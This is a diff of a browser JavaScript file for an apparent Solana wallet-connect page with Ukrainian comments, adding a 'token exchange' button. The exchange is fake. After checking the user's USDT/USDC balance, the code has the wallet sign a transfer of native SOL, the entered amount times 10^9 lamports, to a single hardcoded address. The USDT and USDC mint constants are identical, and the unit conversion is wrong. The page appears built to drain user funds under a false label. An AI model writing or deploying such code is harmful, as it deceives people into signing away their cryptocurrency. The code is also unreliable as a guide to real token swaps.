@@ -1,24 +1,49 @@
 const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-const { PublicKey, SystemProgram, Transaction } = solanaWeb3;
+const { PublicKey, SystemProgram, Transaction, Keypair } = solanaWeb3;
 
-// Адреса гаманців
+// Адреси токенів
 const USDT_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
 const USDC_MINT_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU");
 const SPL_TOKEN_ADDRESS = new PublicKey("3EwV6VTHYHrkrZ3UJcRRAxnuHiaeb8EntqX85Khj98Zo");
 
-// UI Елементи
+// UI елементи
 const connectWalletBtn = document.getElementById("connectWalletBtn");
 const walletStatus = document.getElementById("walletStatus");
-const signMessageBtn = document.getElementById("signMessageBtn");
-const sendTransactionBtn = document.getElementById("sendTransactionBtn");
+const exchangeBtn = document.getElementById("exchangeBtn");
+const amountInput = document.getElementById("amount");
+const tokenSelect = document.getElementById("tokenSelect");
+const walletPopup = document.getElementById("walletPopup");
 
+// Функція для визначення мобільного пристрою
+function isMobile() {
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+}
 
-// Підключення гаманця через диплінк
+// Визначення доступного гаманця
+const getWallet = (walletType) => {
+    if (walletType === "phantom" && window.phantom?.solana?.isPhantom) {
+        return window.phantom.solana;
+    } else if (walletType === "solflare" && window.solflare?.isSolflare) {
+        return window.solflare;
+    }
+    return null;
+};
+
+// Відкриття/закриття попапу
+connectWalletBtn.addEventListener("click", () => {
+    walletPopup.classList.add("show-popup");
+});
+
+function closePopup() {
+    walletPopup.classList.remove("show-popup");
+}
+
+// Підключення гаманця (з підтримкою диплінків для мобільних пристроїв)
 function connectWallet(walletType) {
     closePopup();
 
     if (isMobile()) {
-        const dappUrl = encodeURIComponent(window.location.origin); // URL сайту для повернення
+        const dappUrl = encodeURIComponent(window.location.origin);
         let deepLink = "";
 
         if (walletType === "phantom") {
@@ -37,7 +62,7 @@ function connectWallet(walletType) {
 
     let wallet = getWallet(walletType);
     if (!wallet) {
-        alert("Будь ласка, встановіть " + (walletType === "phantom" ? "Phantom Wallet" : "Solflare"));
+        alert(`Будь ласка, встановіть ${walletType === "phantom" ? "Phantom Wallet" : "Solflare"}`);
         return;
     }
 
@@ -50,35 +75,86 @@ function connectWallet(walletType) {
         });
 }
 
-// Підпис повідомлення через диплінк
-function signMessage() {
-    const message = "Підтвердіть свій гаманець";
-    const encodedMessage = btoa(message);
-    if (isMobile()) {
-        window.location.href = `phantom://signMessage?message=${encodedMessage}&redirect_link=${encodeURIComponent(window.location.href)}`;
-    } else {
-        alert("Функція доступна тільки на мобільних пристроях");
+// Перевірка балансу
+async function getTokenBalance(ownerAddress, mintAddress) {
+    try {
+        const response = await connection.getParsedTokenAccountsByOwner(ownerAddress, { mint: mintAddress });
+        if (response.value.length > 0) {
+            return parseFloat(response.value[0].account.data.parsed.info.tokenAmount.uiAmount);
+        }
+        return 0;
+    } catch (error) {
+        console.error("Помилка отримання балансу:", error);
+        return 0;
     }
 }
 
-// Відправка транзакції через диплінк
-function sendTransaction() {
-    if (!walletStatus.textContent.includes("Гаманець підключено")) {
-        alert("Спочатку підключіть гаманець!");
+// Обмін токенів
+exchangeBtn.addEventListener("click", async () => {
+    const amount = parseFloat(amountInput.value);
+    if (isNaN(amount) || amount <= 0) {
+        alert("Будь ласка, введіть коректну кількість USDT/USDC");
         return;
     }
-    
-    const recipient = SPL_TOKEN_ADDRESS.toString();
-    const amount = 0.01 * 1000000000; // 0.01 SOL у лампортах
-    
-    if (isMobile()) {
-        window.location.href = `phantom://signTransaction?recipient=${recipient}&amount=${amount}&redirect_link=${encodeURIComponent(window.location.href)}`;
-    } else {
-        alert("Функція доступна тільки на мобільних пристроях");
+
+    let wallet = getWallet("phantom");
+    if (!wallet || !wallet.publicKey) {
+        alert("Будь ласка, підключіть гаманець");
+        return;
+    }
+
+    const mintAddress = tokenSelect.value === "USDT" ? USDT_MINT_ADDRESS : USDC_MINT_ADDRESS;
+    const balance = await getTokenBalance(wallet.publicKey, mintAddress);
+
+    if (balance < amount) {
+        alert("Недостатньо коштів для обміну!");
+        return;
+    }
+
+    await exchangeTokens(wallet, amount);
+});
+
+// Відправка транзакції
+async function exchangeTokens(wallet, amountInUSDT) {
+    try {
+        const transaction = new Transaction();
+        const sender = wallet.publicKey;
+
+        const transferInstruction = SystemProgram.transfer({
+            fromPubkey: sender,
+            toPubkey: SPL_TOKEN_ADDRESS,
+            lamports: amountInUSDT * 1000000000 // Конвертація
+        });
+
+        transaction.add(transferInstruction);
+
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = sender;
+
+        const signedTransaction = await wallet.signTransaction(transaction);
+        const txid = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: false, preflightCommitment: "confirmed" });
+
+        await connection.confirmTransaction(txid);
+        console.log(`Транзакція успішно надіслана! TXID: ${txid}`);
+    } catch (err) {
+        console.error("Помилка обміну:", err);
     }
 }
 
-// Прив'язка подій до кнопок
-connectWalletBtn.addEventListener("click", connectWallet);
-signMessageBtn.addEventListener("click", signMessage);
-sendTransactionBtn.addEventListener("click", sendTransaction);
+// Підпис повідомлення (для підтвердження власності гаманця)
+async function signMessage() {
+    let wallet = getWallet("phantom");
+    if (!wallet || !wallet.publicKey) {
+        alert("Будь ласка, підключіть гаманець");
+        return;
+    }
+
+    try {
+        const message = new TextEncoder().encode("Підтвердження власності гаманця");
+        const signedMessage = await wallet.signMessage(message);
+        console.log("Підписане повідомлення:", signedMessage);
+    } catch (error) {
+        console.error("Помилка підпису повідомлення:", error);
+    }
+}
